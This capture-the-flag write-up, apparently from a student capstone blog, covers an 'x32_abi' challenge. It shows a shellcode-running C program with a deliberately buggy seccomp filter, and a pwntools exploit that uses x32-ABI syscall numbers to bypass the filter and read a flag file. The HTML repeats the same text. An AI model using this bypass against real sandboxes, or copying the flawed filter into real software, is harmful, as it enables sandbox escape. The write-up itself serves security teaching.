# x32_abi Challenge
## Code Analysis

This program simply takes shellcode from the user and runs it.

```c
#include <stdio.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>

#define ARRAY_SIZE(array) (sizeof(array) / sizeof(array[0]))

int filter_syscalls() {
  int ret = -1;

  struct sock_filter code[] = {
    /* op,   jt,   jf,     k    */
    {0x20, 0x00, 0x00, 0x00000004},  // Verify x86_64 Arch
    {0x15, 0x00, 0x09, 0xc000003e},
    {0x20, 0x00, 0x00, 0x00000000},
    {0x35, 0x06, 0x00, 0x40000000},  // Determine if using x86 syscall ABI | Bug: Jumps to ALLOW (relative jumps are hard).
    {0x15, 0x06, 0x00, 0x00000142},
    {0x15, 0x05, 0x00, 0x00000101},
    {0x15, 0x04, 0x00, 0x00000055},
    {0x15, 0x03, 0x00, 0x00000002},
    {0x15, 0x02, 0x00, 0x0000003b},
    {0x15, 0x01, 0x00, 0x00000027},
    {0x06, 0x00, 0x00, 0x7fff0000},
    {0x06, 0x00, 0x00, 0x00000000},
  };

  struct sock_fprog bpf = {
    .len = ARRAY_SIZE(code),
    .filter = code,
  };

  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
  prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &bpf);

  return 0;
}

void main(void) {
  char shellcode[1024];
  /* initialize the libseccomp context */
  filter_syscalls();

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);

  /* Run shellcode from user */
  puts("Give me some shellcode to execute :) ");
  scanf("%s", &shellcode);
  int (*ret)() = (int(*)())shellcode;
  ret();
}
```

We run seccomp-tools on it to analyze the filter:

```shell
iqimpz@ubuntu:~/$ seccomp-tools dump ./x32_abi
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
 0004: 0x15 0x06 0x00 0x00000142  if (A == execveat) goto 0011
 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011
 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011
 0009: 0x15 0x01 0x00 0x00000027  if (A == getpid) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

We see that execve and execveat are blocked, so no simple shell. read and write are not blocked, but since creat, open, and openat are blocked, so we can't open the flag file. But if you look at line 0003, you can see that if the x32 syscall ABI is used, it jumps to ALLOW instead of KILL.

## Exploit

With the x32 syscall ABI accessable, we will use it to call open on the flag file, then since read and write arn't blocked, we can simply use those to write the flag to stdout.

```python
#!/usr/bin/python
from pwn import *

e = ELF("./x32_abi")
p = e.process()
context.binary = "./x32_abi"

sh  = '''   
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e /* ./flag in little_endian */
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push 0x40000002 /* Using 0x40000002 instead of 0x2 to bypass seccomp */
    pop rax
    syscall
'''
sh += shellcraft.read(3, 'rsp', 0x1000)
sh += shellcraft.write(1, 'rsp', 'rax')
sh += shellcraft.exit(0)

p.send(asm(sh))
p.interactive()
```









# HTML
```
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant="" defer=""></script>
  
    <title>X32_abi_Challenge :: Capstone Project</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This program simply takes shellcode from the user and runs it.
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/prctl.h&amp;gt;#include &amp;lt;linux/seccomp.h&amp;gt;#include &amp;lt;linux/filter.h&amp;gt; #define ARRAY_SIZE(array) (sizeof(array) / sizeof(array[0]))  int filter_syscalls() {  int ret = -1;   struct sock_filter code[] = {  /* op, jt, jf, k */  {0x20, 0x00, 0x00, 0x00000004}, // Verify x86_64 Arch  {0x15, 0x00, 0x09, 0xc000003e},  {0x20, 0x00, 0x00, 0x00000000},  {0x35, 0x06, 0x00, 0x40000000}, // Determine if using x86 syscall ABI | Bug: Jumps to ALLOW (relative jumps are hard).">
<meta name="keywords" content="">
<meta name="robots" content="noodp">
<link rel="canonical" href="/posts/x32_abi_challenge-post-1/">




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/pink.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/pink.png">



<meta name="twitter:card" content="summary">



<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="X32_abi_Challenge">
<meta property="og:description" content="This program simply takes shellcode from the user and runs it.
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/prctl.h&amp;gt;#include &amp;lt;linux/seccomp.h&amp;gt;#include &amp;lt;linux/filter.h&amp;gt; #define ARRAY_SIZE(array) (sizeof(array) / sizeof(array[0]))  int filter_syscalls() {  int ret = -1;   struct sock_filter code[] = {  /* op, jt, jf, k */  {0x20, 0x00, 0x00, 0x00000004}, // Verify x86_64 Arch  {0x15, 0x00, 0x09, 0xc000003e},  {0x20, 0x00, 0x00, 0x00000000},  {0x35, 0x06, 0x00, 0x40000000}, // Determine if using x86 syscall ABI | Bug: Jumps to ALLOW (relative jumps are hard).">
<meta property="og:url" content="/posts/x32_abi_challenge-post-1/">
<meta property="og:site_name" content="Capstone Project">

  <meta property="og:image" content="/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-03-31 11:51:14 -0700 PDT">












</head>
<body class="pink">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Capstone Project
  </div>
</a>

    </div>
    
      <div class="menu-trigger hidden">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/x32_abi_challenge-post-1/">X32_abi_Challenge</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-03-31
        
      </span>
    
    
    
  </div>

  
  


  

  <div class="post-content"><div>
        <p>This program simply takes shellcode from the user and runs it.</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/seccomp.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/filter.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ARRAY_SIZE</span><span class="token expression"><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-sizeof">sizeof</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword keyword-sizeof">sizeof</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword keyword-int">int</span> <span class="token function">filter_syscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword keyword-int">int</span> ret <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">sock_filter</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment">/* op,   jt,   jf,     k    */</span>
    <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">// Verify x86_64 Arch</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xc000003e</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x40000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">// Determine if using x86 syscall ABI | Bug: Jumps to ALLOW (relative jumps are hard).</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000142</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000101</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000055</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x0000003b</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000027</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">sock_fprog</span> bpf <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token function">ARRAY_SIZE</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">.</span>filter <span class="token operator">=</span> code<span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NO_NEW_PRIVS<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_SECCOMP<span class="token punctuation">,</span> SECCOMP_MODE_FILTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bpf<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-void">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword keyword-char">char</span> shellcode<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* initialize the libseccomp context */</span>
  <span class="token function">filter_syscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Run shellcode from user */</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me some shellcode to execute :) "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword keyword-int">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>ret<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword keyword-int">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">;</span>
  <span class="token function">ret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p>We run seccomp-tools on it to analyze the filter:</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-shell"><code class=" language-shell" data-lang="shell">iqimpz@ubuntu:~/$ seccomp-tools dump ./x32_abi
 line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
 0001: 0x15 0x00 0x09 0xc000003e  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
 0003: 0x35 0x06 0x00 0x40000000  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">&gt;=</span> 0x40000000<span class="token punctuation">)</span> goto 0010
 0004: 0x15 0x06 0x00 0x00000142  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execveat<span class="token punctuation">)</span> goto 0011
 0005: 0x15 0x05 0x00 0x00000101  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> openat<span class="token punctuation">)</span> goto 0011
 0006: 0x15 0x04 0x00 0x00000055  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> creat<span class="token punctuation">)</span> goto 0011
 0007: 0x15 0x03 0x00 0x00000002  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0011
 0008: 0x15 0x02 0x00 0x0000003b  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0011
 0009: 0x15 0x01 0x00 0x00000027  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> getpid<span class="token punctuation">)</span> goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
 0011: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p>We see that execve and execveat are blocked, so no simple shell. read and write are not blocked, but since creat, open, and openat are blocked, so we can’t open the flag file. But if you look at line 0003, you can see that if the x32 syscall ABI is used, it jumps to ALLOW instead of KILL.</p>
<p>With the x32 syscall ABI accessable, we will use it to call open on the flag file, then since read and write arn’t blocked, we can simply use those to write the flag to stdout.</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-python"><code class=" language-python" data-lang="python"><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword keyword-from">from</span> pwn <span class="token keyword keyword-import">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./x32_abi"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> e<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./x32_abi"</span>

sh  <span class="token operator">=</span> <span class="token triple-quoted-string string">'''   
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e /* ./flag in little_endian */
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push 0x40000002 /* Using 0x40000002 instead of 0x2 to bypass seccomp */
    pop rax
    syscall
'''</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token string">'rax'</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div>
      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr>
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/x32_abi-post-1/">
                <span class="button__text">X32_ABI SECCOMP Bypass</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>



</body></html>
```
